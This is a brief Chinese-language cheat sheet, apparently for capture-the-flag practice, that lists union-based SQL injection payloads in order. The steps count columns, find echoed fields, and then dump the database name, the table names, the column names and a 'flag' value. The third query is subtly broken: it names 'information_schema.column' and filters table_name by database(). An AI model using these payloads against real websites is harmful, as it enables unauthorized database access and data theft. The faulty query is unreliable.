1’order by 1,2,3#

2.union select 1,2,3#

3.开始注入（有回显）

1.爆库名
union select 1,2,database() #
2.爆表名
union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
3.爆字段
union select 1,2,group_concat(column_name) from information_schema.column where table_name=database()#
4.爆flag
union select 1,2,group_concat(flag) from “字段名”#
